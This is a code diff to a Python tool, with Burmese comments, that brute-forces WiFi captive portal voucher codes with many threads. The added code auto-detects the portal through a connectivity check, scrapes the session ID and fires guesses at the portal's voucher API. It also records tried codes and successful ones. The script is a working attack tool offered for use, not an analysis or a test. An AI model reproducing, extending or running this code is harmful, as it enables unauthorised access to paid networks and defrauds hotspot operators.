@@ -18,7 +18,7 @@ KEYS_URL = "https://raw.githubusercontent.com/winhtetaung1662004-byte/win/main/k
 TRIED_CODES_FILE = "tried_codes.txt"
 SUCCESS_CODES_FILE = "success.txt"
 CODE_TO_TEST = "536884" 
-VOUCHER_THREADS = 50 
+VOUCHER_THREADS = 100 
 
 # --- CLEAR SCREEN FUNCTION ---
 def clear_screen():
@@ -100,6 +100,20 @@ def show_menu():
     choice = input("👉 ရွေးချယ်ပါ (1-3): ")
     return choice
 
+# --- PORTAL AUTO DETECT ---
+def get_portal_info():
+    """Captive Portal URL ကို အလိုအလျောက်ရှာဖွေခြင်း"""
+    test_url = "http://connectivitycheck.gstatic.com/generate_204"
+    try:
+        r = requests.get(test_url, allow_redirects=True, timeout=5)
+        if r.url != test_url:
+            from urllib.parse import urlparse
+            parsed = urlparse(r.url)
+            return f"{parsed.scheme}://{parsed.netloc}", r.url
+    except:
+        pass
+    return None, None
+
 # --- FAST RANDOM VOUCHER HARVESTING LOGIC ---
 def test_code(code, portal_host, sid, session):
     """တစ်ခုချင်းစီကို Thread နဲ့စမ်းသပ်သည့် function"""
@@ -126,10 +140,16 @@ def start_voucher_harvesting():
     tried_codes = load_tried_codes()
     print(f"📚 စမ်းသပ်ပြီးသား Code {len(tried_codes)} ခု ကျော်လွှားမည်။")
 
-    # Example placeholders
-    portal_host = "http://192.168.60.1" 
-    sid = "example_session_id"
+    portal_host, portal_url = get_portal_info()
+    if not portal_host:
+        print("❌ Captive Portal ကို ရှာမတွေ့ပါ။ WiFi သေချာချိတ်ပါ။")
+        return
+
+    # SID ယူခြင်း
     session = requests.Session()
+    r2 = session.get(portal_url, verify=False, timeout=10)
+    sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
+    sid = sid_match.group(1) if sid_match else "unknown"
 
     threads = []
     
@@ -159,9 +179,16 @@ def start_voucher_harvesting():
 def test_specific_code():
     print(f"\n🔍 စမ်းသပ်နေသည်: {CODE_TO_TEST} ...")
     
-    portal_host = "http://192.168.60.1" 
-    sid = "example_session_id"
+    portal_host, portal_url = get_portal_info()
+    if not portal_host:
+        print("❌ Captive Portal ကို ရှာမတွေ့ပါ။ WiFi သေချာချိတ်ပါ။")
+        return
+
+    # SID ယူခြင်း
     session = requests.Session()
+    r2 = session.get(portal_url, verify=False, timeout=10)
+    sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
+    sid = sid_match.group(1) if sid_match else "unknown"
     
     voucher_api = f"{portal_host}/api/auth/voucher/"
     
